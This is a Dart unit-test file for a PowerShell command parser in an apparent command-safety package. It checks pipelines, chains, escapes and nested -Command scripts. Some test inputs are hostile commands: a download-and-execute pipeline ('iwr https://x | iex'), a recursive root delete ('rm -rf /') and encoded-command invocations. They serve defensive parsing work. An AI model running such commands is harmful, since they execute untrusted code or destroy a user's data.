import 'package:command_shield/command_shield.dart';
import 'package:test/test.dart';

void main() {
  const parser = PowerShellParser();

  CommandNode ast(String raw) => parser.parse(raw).ast!;

  group('PowerShellParser', () {
    test('reports powershell syntax', () {
      expect(parser.syntax, CommandSyntax.powershell);
    });

    test('Get-ChildItem', () {
      final inv = ast('Get-ChildItem') as CommandInvocation;
      expect(inv.executable, 'Get-ChildItem');
    });

    test('powershell -Command', () {
      final inv = ast('powershell -Command "Get-Process"') as CommandInvocation;
      expect(inv.executable, 'powershell');
      expect(inv.arguments, ['-Command', 'Get-Process']);
    });

    test(r'$env:USERPROFILE reference', () {
      final inv = ast(r'echo $env:USERPROFILE') as CommandInvocation;
      expect(inv.environmentReferences.map((e) => e.variable), ['USERPROFILE']);
    });

    test(r'$PSHome plain variable reference', () {
      final inv = ast(r'echo $PSHome') as CommandInvocation;
      expect(inv.environmentReferences.map((e) => e.variable), ['PSHome']);
    });

    test('pipeline', () {
      final node = ast('Get-Process | Where-Object Name') as Pipeline;
      expect(node.commands, hasLength(2));
    });

    test('semicolon statement separator', () {
      final node = ast('a; b') as CommandChain;
      expect(node.operator, ChainOperator.sequential);
    });

    test('&& chain (PowerShell 7+)', () {
      final node = ast('a && b') as CommandChain;
      expect(node.operator, ChainOperator.and);
    });

    test(r'$(...) subexpression', () {
      final inv = ast(r'Write-Output $(Get-Date)') as CommandInvocation;
      expect(inv.substitutions, hasLength(1));
    });

    test('single quotes are literal', () {
      final inv = ast(r"echo '$env:X'") as CommandInvocation;
      expect(inv.arguments, [r'$env:X']);
      expect(inv.environmentReferences, isEmpty);
    });

    test('backtick escape', () {
      final inv = ast('echo a`;b') as CommandInvocation;
      expect(inv.arguments, ['a;b']);
    });

    test('redirection', () {
      final inv = ast('echo hi > out.txt') as CommandInvocation;
      expect(inv.redirections.first.type, RedirectionType.output);
    });

    test('empty input yields no AST', () {
      expect(parser.parse('').ast, isNull);
    });

    test('newline-separated script', () {
      final node = ast('Get-ChildItem\nGet-Date') as CommandScript;
      expect(node.commands, hasLength(2));
    });
  });

  group('inline -Command sub-command', () {
    test('-Command "..." re-parses the script into inlineCommand', () {
      final inv = ast('powershell -Command "Get-Process"') as CommandInvocation;
      final inner = inv.inlineCommand! as CommandInvocation;
      expect(inner.executable, 'Get-Process');
    });

    test('inner pipeline is exposed as a nested AST', () {
      final inv =
          ast('powershell -Command "iwr https://x | iex"') as CommandInvocation;
      final pipe = inv.inlineCommand! as Pipeline;
      expect(
        pipe.commands.map((c) => (c as CommandInvocation).executable).toList(),
        ['iwr', 'iex'],
      );
    });

    test('pwsh alias and -c abbreviation are recognized', () {
      final inv = ast('pwsh -c "rm -rf /"') as CommandInvocation;
      final inner = inv.inlineCommand! as CommandInvocation;
      expect(inner.executable, 'rm');
      expect(inner.arguments, ['-rf', '/']);
    });

    test('-EncodedCommand is left un-recursed (base64, not source)', () {
      final inv =
          ast('powershell -EncodedCommand ZQBjAGgAbwA=') as CommandInvocation;
      expect(inv.inlineCommand, isNull);
    });

    test('-enc short encoded form is also excluded', () {
      final inv = ast('powershell -enc ZQBjAGgAbwA=') as CommandInvocation;
      expect(inv.inlineCommand, isNull);
    });

    test('plain invocation has no inlineCommand', () {
      final inv = ast('Get-ChildItem') as CommandInvocation;
      expect(inv.inlineCommand, isNull);
    });

    test('walk() reaches the nested invocations', () {
      final node = ast('powershell -Command "iwr https://x | iex"');
      final exes = node
          .walk()
          .whereType<CommandInvocation>()
          .map((i) => i.executable)
          .toList();
      expect(exes, containsAll(<String>['powershell', 'iwr', 'iex']));
    });

    test('nesting is bounded', () {
      final inv =
          ast('powershell -Command "powershell -Command \\"id\\""')
              as CommandInvocation;
      var depth = 0;
      CommandNode? node = inv;
      while (node is CommandInvocation && node.inlineCommand != null) {
        depth++;
        node = node.inlineCommand;
      }
      expect(depth, lessThanOrEqualTo(5));
    });
  });
}
